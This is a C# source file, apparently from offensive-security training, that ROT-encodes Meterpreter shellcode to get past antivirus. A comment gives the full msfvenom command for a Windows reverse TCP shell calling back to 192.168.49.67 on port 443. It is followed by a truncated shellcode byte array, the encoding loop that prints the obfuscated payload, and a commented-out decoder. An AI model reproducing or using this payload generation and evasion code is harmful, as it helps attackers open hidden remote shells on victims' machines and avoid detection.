using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace rot_encoder
{
    internal class Program
    {
        static void Main(string[] args)
        {
            // msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.49.67 LPORT=443 EXITFUNC=thread -f csharp
            byte[] buf = new byte[511] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,
            0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,
            ------------------------------------------------------------
            0xd5};

            if (args.Length == 0)
            {
                System.Console.WriteLine("Please enter a numeric argument for the number of rotations.");
                return;
            }

            int rotNo = int.Parse(args[0]);

            // Encode the payload with rotation
            byte[] encoded = new byte[buf.Length];
            for (int i = 0; i < buf.Length; i++)
            {
                encoded[i] = (byte)(((uint)buf[i] + rotNo) & 0xFF);
            }

            StringBuilder hex = new StringBuilder(encoded.Length * 2);
            int totalCount = encoded.Length;
            for (int count = 0; count < totalCount; count++)
            {
                byte b = encoded[count];

                if ((count + 1) == totalCount) // Dont append comma for last item
                {
                    hex.AppendFormat("0x{0:x2}", b);
                }
                else
                {
                    hex.AppendFormat("0x{0:x2}, ", b);
                }
            }

            Console.WriteLine($"ROT{rotNo} payload:");
            Console.WriteLine($"byte[] buf = new byte[{buf.Length}] {{ {hex} }};");

            //// Decode the ROTxx payload (make sure to change rotations)
            // for (int i = 0; i < buf.Length; i++)
            // {
            //    buf[i] = (byte)(((uint)buf[i] - 37) & 0xFF);
            //}

        }
    }
}
